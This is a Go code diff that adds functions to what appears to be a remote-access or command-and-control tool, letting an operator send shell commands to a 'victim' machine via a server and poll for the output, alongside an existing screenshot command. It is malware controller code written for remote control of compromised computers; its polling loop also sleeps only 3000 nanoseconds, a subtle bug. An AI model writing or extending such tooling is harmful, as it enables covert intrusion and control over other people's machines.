@@ -27,6 +27,32 @@ func ExecuteScreenshot(com *models.Command, aliasRepo *repo.AliasRepo) error {
 	}
 }
 
+func ExecuteShell(com *models.Command, aliasRepo *repo.AliasRepo) (string, error) {
+	err := ExecutePostRequest(com, aliasRepo)
+	if err != nil {
+		return "", err
+	}
+	for i := 0; i < 8; i++ {
+		time.Sleep(3000)
+		res, err := ExecuteShellGet(com, aliasRepo)
+		if res != "" || err != nil {
+			return res, err
+		}
+	}
+	return "", errors.New("Timeout exception")
+}
+
+func ExecuteShellGet(com *models.Command, aliasRepo *repo.AliasRepo) (string, error) {
+	var res string
+	resp, err := network.GetFromServer(&models.TextLog{Body: "shell", Log: models.Log{Date: time.Now(), Victim: aliasRepo.GetVictim(com.Body[0])}})
+	if err != nil {
+		fmt.Println("Error reaching the server")
+		return "", err
+	}
+	json.NewDecoder(resp.Body).Decode(&res)
+	return res, nil
+}
+
 func ExecuteAliasCommand(command *models.Command, aliasRepo *repo.AliasRepo) error {
 	if command.Method == utils.GET {
 		aliasRepo.PrintAll()
